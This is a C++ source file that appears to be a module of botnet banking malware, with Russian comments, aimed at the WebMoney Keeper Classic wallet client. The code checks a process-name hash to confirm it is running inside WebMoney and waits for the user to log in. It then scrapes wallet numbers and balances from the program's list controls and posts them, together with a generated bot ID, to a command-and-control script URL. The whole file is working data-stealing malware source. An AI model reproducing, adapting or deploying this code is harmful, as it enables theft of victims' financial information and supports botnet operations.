// web_money_dll.cpp : Defines the entry point for the DLL application.
//


#include "windows.h"
#include "commctrl.h"
#include "tlhelp32.h"
#include "BotUtils.h"
#include "Memory.h"
#include "GetApi.h"
#include "Utils.h"
#include "Strings.h"

#include "web_money_dll.h"
#include "BotHTTP.h"
#include "Config.h"
//#include "BotDebug.h"

template <class STR>
void WebMonyLoger_Template(STR Str)
{
	#ifdef DebugUtils
		Debug::MessageEx("InternetExplorer", 0, NULL, NULL, (PCHAR)Str);
	#endif
}


#define DBG_Messag WebMonyLoger_Template<>

// Макрос для получения выделенного Item  в TabCtrl

#define pTabCtrl_GetCurSel(hwnd, i) \
    (int)pSendMessageA((hwnd), TCM_GETCURSEL, (WPARAM)(i), 0)

// Макрос для измения текста заданого  Itemа  в TabCtrl	(не используеться нужен был для тестирования)
#define pListView_SetItemText(hwndLV, i, iSubItem_, pszText_) \
{ LV_ITEM _macro_lvi;\
  _macro_lvi.iSubItem = (iSubItem_);\
  _macro_lvi.pszText = (pszText_);\
  pSendMessageA((hwndLV), LVM_SETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
}

///// Макрос для получения  текста заданого  Itemа  в TabCtrl
#define pListView_GetItemText(hwndLV, i, iSubItem_, pszText_, cchTextMax_) \
{ LV_ITEM _macro_lvi;\
  _macro_lvi.iSubItem = (iSubItem_);\
  _macro_lvi.cchTextMax = (cchTextMax_);\
  _macro_lvi.pszText = (pszText_);\
  pSendMessageA((hwndLV), LVM_GETITEMTEXT, (WPARAM)(i), (LPARAM)(LV_ITEM *)&_macro_lvi);\
}


extern"C" void check(HWND hwnd);

HMODULE hDll;

// получает баланс вебмани
void GetWebmoneyBalans(HWND hwnd,char* buf_str ){
	int count = (int)pSendMessageA(hwnd,LVM_GETITEMCOUNT,0,0);//ListView_GetItemCount(hwnd);
	*buf_str = 0;
	while(count--){
	  char buf[256];
	//  pListView_SetItemText(hwnd,count,0,"0");
	//  pListView_SetItemText(hwnd,count,1,"1");
	  
	  pListView_GetItemText(hwnd,count,0,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");	
	  pListView_GetItemText(hwnd,count,1,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");		
	  pListView_GetItemText(hwnd,count,2,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);		 plstrcatA(buf_str, " ");			 
	  pListView_GetItemText(hwnd,count,3,(char*)buf,sizeof(buf));
		plstrcatA(buf_str,buf);	  plstrcatA(buf_str, "\r\n");  	
	};

};
// отправляет баланс 
void SendBalanseToLog(PCHAR Coment);

//вызывает  функцию получения баланса, и если баланс получен(бывает просто пустая строка с пробелами) то пишет его в буфер 
void check(HWND hwnd,PCHAR Buffer)
{
char*str_list = (char*)MemAlloc(16*1024);
*str_list = 0;
	GetWebmoneyBalans(hwnd,str_list);
	if (*str_list > ' '){
 		plstrcatA(Buffer,str_list); 		
	};
MemFree(str_list);
};



//	перебирает все дочернее окна для определения нужных окон в вебмани
//
BOOL CALLBACK EnumWindowsProc0( HWND hwnd_WebMoney,
							   LPARAM lParam
							  )
{	
	HWND hwnd = hwnd_WebMoney;
	DWORD pid = 0;
	BOOL IsLogonWindow = TRUE;
	BOOL IsMoneyWindow = FALSE;
// проверка пренадлежыт ли окно текущему процессу (тоесть вебмани)
	pGetWindowThreadProcessId(hwnd_WebMoney,&pid);
	if ((DWORD)pGetCurrentProcessId() ==  pid)
	{
		HWND temp = hwnd;

		char buf[256];
		pGetWindowTextA(hwnd,buf,sizeof(buf)-1);

		if (!pStrStrA(buf,"WebMoney"))
			return TRUE;


		while(IsLogonWindow)		/// цикл будет работать до тех пор пока не введем пароль
		{
			IsLogonWindow = FALSE;
			do
			{	
				pGetWindowTextA(hwnd,buf,sizeof(buf)-1);
				if (pStrStrA(buf,"WebMoney Keeper Classic"))
				{
					IsLogonWindow = TRUE;
					break;
				}
				hwnd = (HWND)pFindWindowExA(NULL,hwnd,NULL,NULL);
			}while(hwnd);
			hwnd=temp;
		}

		if (IsLogonWindow)	
			return TRUE;
	
		// цикл будет ждать пока вебмани не инициализирует все свои окна
		IsLogonWindow = FALSE;
		do
		{	
			pGetWindowTextA(hwnd,buf,sizeof(buf)-1);
			if (pStrStrA(buf,"WebMoney Keeper") && pStrStrA(buf,"WMID"))
			{
				IsLogonWindow = TRUE;
				break;
			}
			hwnd = (HWND)pFindWindowExA(NULL,hwnd,NULL,NULL);
		}while(hwnd);

		if (!IsLogonWindow)
			return TRUE;


		pSleep(10000);
	//  делаем поиск котролов класса SysTabControl32 в окнах вебмани, в одном из таких окон находиться баланс
	//
		hwnd = (HWND)pFindWindowExA(hwnd,0,"SysTabControl32",NULL);
		while( 1 != pTabCtrl_GetCurSel(hwnd,1))	// ждем пока не будет активной вкладка кошельков
			pSleep(100);
		pSleep(1000);
		IsMoneyWindow = TRUE;
		hwnd = 0;
		
		PCHAR Buffer = STR::Alloc(4096);
		m_memset(Buffer,0,4096);
		DBG_Messag("after WEBMoney!!!");
	//	собственно получения данных из SysListView32, там список кошельков 
	/// 
		do
		{	
			hwnd = (HWND)pFindWindowExA(temp,hwnd,"SysListView32",NULL);
			check(hwnd,Buffer);
		}while(hwnd);

		// собственно если получили какието данные отправляем их в лог
		if ( plstrlenA(Buffer))
		{
			DBG_Messag(Buffer);

			HANDLE hEvent;
			DBG_Messag("OpenEvent");
			while( ! (hEvent = pOpenEventA(EVENT_MODIFY_STATE,FALSE,WEBMONEY_EVENT)) ){
				pSleep(1000);
				DBG_Messag("OpenEvent...");
			};
			DBG_Messag("pCloseHandle");
			pCloseHandle(hEvent);
		
			SendBalanseToLog(Buffer);


			//send 
			*((PDWORD)lParam) = 1;
		}
		else
		{
			*((PDWORD)lParam) = 0;
		};
		DBG_Messag("before WEBMoney!!!");	
		STR::Free(Buffer);

		 
		
	}

	return TRUE;
}


//Процедура потока в которой происходит перебор всех окон в системе
//
DWORD WINAPI ThreadProc(PVOID p)
{
	DWORD IsExit = 0;
	Sleep(3000);
	hDll  = (HMODULE)pLoadLibraryA("shlwapi.dll");
// перебор всех окон пока не найдем нужное и не получем баланс
	do
	{	
		pEnumWindows(EnumWindowsProc0,(LPARAM)&IsExit); 
		pSleep(100);
	} while(!IsExit);
	pFreeLibrary(hDll);
	hDll = 0;
	return 0;
};

/// запуск перебора окон в отдельном потоке (на самом деле хуков не ставит)
void HookWebMoney()
{
	HANDLE hThread ;		
	hThread = StartThread(ThreadProc,NULL);
	pCloseHandle(hThread);


};

// возвращает true если текущий процесс вебмани
bool IsWebMoney()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
    if ( ModulePath == NULL )
    {
		return false;
    }
	
    pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );

    DWORD dwProcessHash = GetNameHash( ModulePath );
	if (dwProcessHash ==   0xF8083E3B) 
	{
		MemFree( ModulePath );
        return true;
    }
    MemFree( ModulePath );
    return false;
};


// отсылка баланса

void SendBalanseToLog(PCHAR Coment)
{		

	DBG_Messag("SendBalanseToLog");
	PCHAR BotID =GenerateBotID();

	PMultiPartData Data = MultiPartData::Create();

	MultiPartData::AddStringField(Data, "id"		, BotID);
	MultiPartData::AddStringField(Data, "t"			, "1");
	MultiPartData::AddStringField(Data, "comment"	, Coment);
	MultiPartData::AddStringField(Data, "hash"		, "0xF8083E3B");

	PCHAR Buf = NULL;
	PCHAR URL = GetBotScriptURL(SCRIPT_COMMENT);

	HTTP::Post(URL, Data, &Buf, NULL);

	STR::Free(BotID);
	STR::Free(URL);
	STR::Free(Buf);
	MultiPartData::Free(Data);

	DBG_Messag("SendBalanseToLog	end");
}

